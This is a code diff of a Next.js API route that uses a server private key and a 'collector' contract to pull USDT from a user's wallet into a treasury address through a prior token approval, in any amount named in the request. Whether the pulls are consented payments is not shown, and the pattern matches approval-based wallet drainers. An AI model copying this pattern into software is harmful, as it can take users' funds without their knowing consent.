@@ -4,7 +4,7 @@
 import { ethers } from "ethers";
 import { headers } from "next/headers";
 import { env } from "~/env";
-import { USDT_BSC } from "~/lib/crypto-functions";
+import { ensureBSC, USDT_BSC } from "~/lib/crypto-functions";
 import { db } from "~/server/db";
 
 export async function POST(req: Request) {
@@ -32,21 +32,52 @@ export async function POST(req: Request) {
   const RPC = "https://bsc-dataseed.binance.org/";
   const provider = new ethers.JsonRpcProvider(RPC);
 
-  const ERC20_ABI = [
-    "function allowance(address owner, address spender) view returns (uint256)",
-    "function transferFrom(address from, address to, uint256 amount)",
-    "function transfer(address to, uint256 amount)",
+  const signer = new ethers.Wallet(env.PRIVATE_KEY, provider);
+
+  // const ERC20_ABI = [
+  //   "function allowance(address owner, address spender) view returns (uint256)",
+  //   "function transferFrom(address from, address to, uint256 amount)",
+  //   "function transfer(address to, uint256 amount)",
+  // ];
+
+  const COLLECTOR_ABI = [
+    "function collect(address token, address user, uint256 amount)",
   ];
 
-  const wallet = new ethers.Wallet(env.PRIVATE_KEY, provider);
+  const collector = new ethers.Contract(
+    env.TREASURY_ADDRESS, // 🔑 APPROVED SPENDER
+    COLLECTOR_ABI,
+    signer,
+  );
+
+  console.log("SIGNER ADDRESS ", signer.address);
+
+  // const wallet = new ethers.Wallet(env.PRIVATE_KEY, provider);
 
   const amount = ethers.parseUnits(body.amount, 18);
 
-  const usdt = new ethers.Contract(USDT_BSC, ERC20_ABI, wallet);
+  // const usdt = new ethers.Contract(USDT_BSC, ERC20_ABI, wallet);
 
-  const tx = await usdt.transferFrom!(
-    walletAddress?.address,
-    env.TREASURY_ADDRESS,
+  // console.log("ADDRESS BACKED", wallet.address);
+
+  // const allowance = await usdt.allowance!(
+  //   "0xB33C12383908C9D5A3202788ff309bfBDaFbcE54", // user
+  //   "0x0C90CD2c2AeDb86F7aDEB78640cB0F5ABb554327", // ACTUAL SPENDER
+  // );
+
+  // console.log("Allowance:", ethers.formatUnits(allowance, 18));
+
+  // const tx = await usdt.transferFrom!(
+  //   "0xB33C12383908C9D5A3202788ff309bfBDaFbcE54",
+  //   "0xeFb4CC65C7572cf880BDC0787E11Fe9429747306",
+  //   amount,
+  // );
+
+  // await tx.wait();
+
+  const tx = await collector.collect!(
+    USDT_BSC,
+    walletAddress?.address, // USER ADDRESS
     amount,
   );
 
